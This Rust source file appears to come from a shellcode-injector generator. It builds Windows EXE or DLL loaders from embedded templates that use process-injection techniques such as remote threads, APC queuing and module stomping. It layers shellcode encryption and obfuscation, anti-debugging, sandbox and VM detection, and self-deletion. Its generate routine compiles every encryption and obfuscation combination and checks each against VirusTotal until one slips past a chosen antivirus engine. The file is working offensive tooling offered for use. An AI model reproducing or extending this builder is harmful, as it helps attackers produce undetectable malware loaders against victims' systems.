use owo_colors::{OwoColorize, Stream::Stdout};
use rust_embed::RustEmbed;
use std::{
    collections::HashMap,
    env::set_current_dir,
    path::{Path, PathBuf},
    process::Command,
};
use strum::IntoEnumIterator;
use strum_macros::{AsRefStr, EnumIter};

use crate::utils::{
    absolute_path, create_root_folder, path_to_string, search_and_replace, write_to_file,
};
use crate::virustotal::VirusTotal;

#[derive(RustEmbed)]
#[folder = "templates"]
pub struct TemplatesLibrary;

#[derive(Debug)]
pub struct Template {
    pub project_path: Option<PathBuf>,
    pub shellcode_path: PathBuf,
    pub execution: Execution,
    pub encryption: Option<Encryption>,
    pub obfuscation: Option<Obfuscation>,
    pub format: Format,
    pub target_process: String,
    pub antidebug: Option<Antidebug>,
    pub sandbox: Option<Sandbox>,
    pub vm: Option<Vm>,
    pub self_destroy: bool,
    pub debug_privilege: bool,
}

#[derive(Debug, Eq, Hash, PartialEq, AsRefStr, Clone)]
pub enum Level {
    Low,
    Basic,
    Paranoid,
}

#[derive(Debug, Clone)]
pub struct Antidebug {
    pub custom: Option<CustomAntidebug>,
    pub preset: Option<Level>,
}

#[derive(Debug, Clone)]
pub struct CustomAntidebug {
    pub detection_methods: Vec<DebugDetection>,
    pub action: DebugActions,
}

#[derive(Debug, Eq, Hash, PartialEq, AsRefStr, Clone)]
pub enum DebugDetection {
    IsDebuggerPresent,
    PebIsDebuggerPresent,
    PebNTGlobalFlag,
    PebHeapFlags,
    CheckRemoteDebuggerPresent,
    NTQueryDebugPort,
    NTQueryDebugObject,
    NTQueryDebugFlags,
    DebugRegisters,
}

#[derive(Debug, Eq, Hash, PartialEq, AsRefStr, Clone)]
pub enum DebugActions {
    Exit,
    Hide,
}

#[derive(Debug, Eq, Hash, PartialEq, AsRefStr, Clone)]
pub enum VmDetection {
    CpuidHWbit,
    CpuidVmVendor,
    Rdtsc,
    RdtscVmExit,
}

#[derive(Debug, Clone)]
pub struct Vm {
    pub custom: Option<Vec<VmDetection>>,
    pub preset: Option<Level>,
}

#[derive(Debug, Eq, Hash, PartialEq, AsRefStr, Clone)]
pub enum SandboxDetection {
    Sbiedll,
    InputTime,
    CursorPosition,
}

#[derive(Debug, Clone)]
pub struct Sandbox {
    pub custom: Option<Vec<SandboxDetection>>,
    pub preset: Option<Level>,
}

#[derive(Debug, AsRefStr, Clone)]
pub enum Execution {
    SysCreateRemoteThread,
    NtCreateRemoteThread,
    NtQueueUserAPC,
    WinCreateRemoteThread,
    ModuleStomping,
    CreateFiber,
    MakeExec,
    Etwp,
    CreateProcess,
    Test,
}

#[derive(Debug, EnumIter, Clone)]
pub enum Encryption {
    Xor,
    SmartXor,
    Aes,
    ChaCha20,
    RC4,
    Rabbit,
}

#[derive(Debug, EnumIter, Clone)]
pub enum Obfuscation {
    Ipv4,
    Ipv6,
    Base32,
    Base45,
    Base58,
    Base62,
    Base64,
    Base85,
    MacAddr,
}

#[derive(Debug, Clone)]
pub enum Format {
    Exe,
    Dll,
}

pub fn write_template(options: &Template, output_folder: PathBuf) {
    let template_name = match options.execution {
        Execution::NtQueueUserAPC => "ntAPC",
        Execution::NtCreateRemoteThread => "ntCRT",
        Execution::SysCreateRemoteThread => "sysCRT",
        Execution::WinCreateRemoteThread => "winCRT",
        Execution::MakeExec => "make_exec",
        Execution::Etwp => "ETWP",
        Execution::CreateFiber => "CreateFiber",
        Execution::CreateProcess => "CreateProcess",
        Execution::ModuleStomping => "ModuleStomping",
        Execution::Test => "Test",
    };

    let mut path_to_cargo_toml = "".to_string();
    let mut path_to_main = "".to_string();
    for file in TemplatesLibrary::iter() {
        if file.contains(template_name) && file.ends_with("main.rs") {
            path_to_main = file.to_string();
            let mut tmp_path = PathBuf::from(path_to_main.as_str());
            tmp_path.pop();
            tmp_path.pop();
            path_to_cargo_toml = tmp_path.join("Cargo.toml").to_string_lossy().to_string();
        }
    }

    if path_to_main.is_empty() || path_to_cargo_toml.is_empty() {
        panic!("[!] main.rs or Cargo.toml of template not found",)
    }

    let cargo_toml = TemplatesLibrary::get(path_to_cargo_toml.clone().as_str())
        .expect("Failed to get Cargo.Toml content")
        .data;
    let main_rs = TemplatesLibrary::get(path_to_main.clone().as_str())
        .expect("Failed to get main.rs content")
        .data;

    write_to_file(&cargo_toml, output_folder.join("Cargo.Toml").as_path())
        .expect("Failed to write Cargo.toml");

    if !output_folder.join("src").exists() {
        std::fs::create_dir(output_folder.join("src")).expect("Failed to create /src dir");
    }
    write_to_file(
        &main_rs,
        output_folder.join("src").join("main.rs").as_path(),
    )
    .expect("Failed to write main.rs")
}

impl Template {
    pub fn new(options: Template) -> Self {
        println!(
            "{} Generating {} template ..",
            "[+]".if_supports_color(Stdout, |text| text.green()),
            options
                .execution
                .as_ref()
                .if_supports_color(Stdout, |text| text.yellow())
        );

        let mut general_output_folder = match cfg!(debug_assertions) {
            true => std::env::current_dir().unwrap(),
            false => std::env::temp_dir(),
        };
        general_output_folder.push("results");
        if !general_output_folder.exists() {
            if let Err(_e) = std::fs::create_dir(&general_output_folder) {
                panic!("\n[!] Failed to create output dir!\n")
            }
        }

        let folder: PathBuf = match create_root_folder(&general_output_folder) {
            Ok(content) => content,
            Err(err) => panic!("[!] {:?}", err),
        };

        write_template(&options, folder.clone());

        let mut to_main = folder.clone();
        to_main.push("src");
        to_main.push("main.rs");

        let absolute_shellcode_path = match absolute_path(&options.shellcode_path) {
            Ok(path) => path,
            Err(err) => panic!("[!] {:?}", err),
        };

        let absolute_shellcode_path_as_string = path_to_string(&absolute_shellcode_path);

        let mut path_to_cargo = to_main.clone();
        path_to_cargo.pop();
        path_to_cargo.pop();
        path_to_cargo.push("Cargo.toml");

        let mut to_be_replaced = HashMap::new();
        to_be_replaced.insert("{{PATH_TO_SHELLCODE}}", absolute_shellcode_path_as_string);
        to_be_replaced.insert("{{DLL_MAIN}}", "".to_string());
        to_be_replaced.insert("{{DLL_FORMAT}}", "".to_string());
        to_be_replaced.insert("{{TARGET_PROCESS}}", options.target_process.clone());

        to_be_replaced.extend(options.encrypt(to_main.clone()));
        to_be_replaced.extend(options.obfuscate(to_main.clone()));
        to_be_replaced.extend(options.antidebug());
        to_be_replaced.extend(options.sandbox());
        to_be_replaced.extend(options.vm());
        to_be_replaced.extend(options.self_destroy());
        to_be_replaced.extend(options.debug_privilege());

        match options.format {
            Format::Dll => {
                let dll_cargo_conf = r#"[lib]
            crate-type = ["cdylib"]"#
                    .to_string();

                to_be_replaced.insert("{{DLL_FORMAT}}", dll_cargo_conf);

                let dll_main_fn = r#"#[no_mangle]
            #[allow(non_snake_case, unused_variables, unreachable_patterns)]
            extern "system" fn DllMain(
                dll_module: u32,
                call_reason: u32,
                _: *mut ())
                -> bool
            {
                match call_reason {
                    DLL_PROCESS_ATTACH => main(),
                    DLL_PROCESS_DETACH => main(),
                    _ => ()
                }
                true
            }
            "#
                .to_string();
                to_be_replaced.insert("{{DLL_MAIN}}", dll_main_fn);

                let mut to_lib = to_main.clone();
                to_lib.pop();
                to_lib.push("lib.rs");

                to_main = match std::fs::rename(to_main, to_lib.clone()) {
                    Ok(()) => to_lib,
                    Err(_e) => panic!("\n[!] Failed to rename main.rs to lib.rs!\n"),
                }
            }
            Format::Exe => (),
        }

        for (key, value) in to_be_replaced.iter() {
            search_and_replace(&to_main, key, value).expect("Failed to modify main.rs template");
            search_and_replace(&path_to_cargo, key, value)
                .expect("Failed to modify Cargo.toml template");
        }

        println!("{} Done generating template!", "[+]".green());

        Template {
            project_path: Some(Path::new(&folder).to_path_buf()),
            shellcode_path: options.shellcode_path,
            execution: options.execution,
            encryption: options.encryption,
            obfuscation: options.obfuscation,
            format: options.format,
            target_process: options.target_process,
            antidebug: options.antidebug,
            sandbox: options.sandbox,
            vm: options.vm,
            self_destroy: options.self_destroy,
            debug_privilege: options.debug_privilege,
        }
    }
    pub fn generate(options: Template, virustotal: &VirusTotal) {
        for encryption_alg in Encryption::iter() {
            for obfuscation_alg in Obfuscation::iter() {
                let template_opts = Template {
                    project_path: None,
                    shellcode_path: options.shellcode_path.clone(),
                    execution: options.execution.clone(),
                    encryption: Some(encryption_alg.clone()),
                    obfuscation: Some(obfuscation_alg.clone()),
                    format: options.format.clone(),
                    target_process: options.target_process.clone(),
                    antidebug: options.antidebug.clone(),
                    sandbox: options.sandbox.clone(),
                    vm: options.vm.clone(),
                    self_destroy: options.self_destroy,
                    debug_privilege: options.debug_privilege,
                };
                let path = Template::new(template_opts).compile();
                if let Some(path) = path {
                    match virustotal.bypass_target.clone() {
                        Some(content) => {
                            if !virustotal.check_one(path.clone()) {
                                println!(
                                    "{} Injector with {} bypass generated! \n{} {}",
                                    "[+]".if_supports_color(Stdout, |text| text.green()),
                                    content.if_supports_color(Stdout, |text| text.yellow()),
                                    "[Result]".if_supports_color(Stdout, |text| text.green()),
                                    path
                                );
                                std::process::exit(0);
                            } else {
                                println!(
                                    "{} Injector {} by {}. Trying another template ..",
                                    "[!]".if_supports_color(Stdout, |text| text.red()),
                                    "detected".if_supports_color(Stdout, |text| text.red()),
                                    content.if_supports_color(Stdout, |text| text.yellow()),
                                )
                            }
                        }
                        None => {
                            panic!("[!] no bypass target found")
                        }
                    }
                }
            }
        }
    }
    pub fn compile(&self) -> Option<String> {
        let mut dest_path = std::env::current_dir().unwrap();
        dest_path.push("results");
        if !dest_path.exists() {
            if let Err(_e) = std::fs::create_dir(&dest_path) {
                panic!("[!] Failed to create output dir for results!\n",)
            }
        }

        let res_exe = self
            .project_path
            .clone()
            .unwrap()
            .clone()
            .join("target")
            .join("x86_64-pc-windows-msvc")
            .join("release");

        println!(
            "{} Starting to compile your template ..",
            "[+]".if_supports_color(Stdout, |text| text.green())
        );

        let res = Self::compiler(&mut self.project_path.clone().unwrap().clone());
        if let Err(err) = res {
            println!(
                "\n{}\n{}",
                "Log:".if_supports_color(Stdout, |text| text.yellow()),
                err
            );
        }

        if cfg!(not(debug_assertions)) {
            std::fs::remove_file(self.project_path.clone().unwrap().join("Cargo.lock"))
                .expect("[!] Failed to remove temporary files");
            std::fs::remove_file(self.project_path.clone().unwrap().join("Cargo.Toml"))
                .expect("[!] Failed to remove temporary files");
            std::fs::remove_dir_all(self.project_path.clone().unwrap().join("src"))
                .expect("[!] Failed to remove temporary files");
        }

        let files = match std::fs::read_dir(&res_exe) {
            Ok(_result) => _result,
            Err(_result) => panic!("\n[!] Compilation error!\n",),
        };
        for file in files {
            if str::ends_with(
                &file.as_ref().unwrap().file_name().to_string_lossy(),
                ".exe",
            ) || str::ends_with(
                &file.as_ref().unwrap().file_name().to_string_lossy(),
                ".dll",
            ) {
                dest_path.push(file.as_ref().unwrap().file_name());

                if let Err(err) = std::fs::copy(file.as_ref().unwrap().path(), &dest_path) {
                    println!(
                        "{} Failed to copy compiled file. \n\
                        {} It may be blocked by your antivirus. \n\
                        {} \n{}",
                        "[!]".if_supports_color(Stdout, |text| text.red()),
                        "[!]".if_supports_color(Stdout, |text| text.red()),
                        "Error log: ".if_supports_color(Stdout, |text| text.red()),
                        err
                    );
                    std::process::exit(0);
                }

                println!(
                    "{} Successfully compiled! \n{} {}",
                    "[+]".if_supports_color(Stdout, |text| text.green()),
                    "[Result]".if_supports_color(Stdout, |text| text.green()),
                    dest_path.as_path().to_string_lossy()
                );

                if cfg!(not(debug_assertions)) {
                    if let Err(_e) = std::fs::remove_dir_all(self.project_path.clone().unwrap()) {
                        std::fs::remove_dir_all(self.project_path.clone().unwrap().join("target"))
                            .expect("[!] Failed to remove temporary files");
                    }
                }

                return Some(dest_path.as_path().to_string_lossy().to_string());
            }
        }
        None
    }

    fn compiler(path_to_cargo_project: &mut PathBuf) -> Result<(), Box<dyn std::error::Error>> {
        let path_to_cargo_folder = path_to_cargo_project.clone();
        path_to_cargo_project.push("Cargo.toml");
        set_current_dir(path_to_cargo_folder)?;
        let output = Command::new("cargo")
            .env("CFLAGS", "-lrt")
            .env("LDFLAGS", "-lrt")
            .env(
                "RUSTFLAGS",
                "-C target-feature=+crt-static \
             -Z location-detail=none",
            )
            .arg("+nightly-x86_64-pc-windows-msvc")
            .arg("build")
            .arg("--release")
            .arg("-Zbuild-std=std,panic_abort")
            .arg("-Zbuild-std-features=panic_immediate_abort")
            .arg("--target=x86_64-pc-windows-msvc")
            .output()?;
        if !output.stderr.is_empty() {
            let error_message = String::from_utf8_lossy(&output.stderr);
            Err(error_message)?
        }
        Ok(())
    }
}
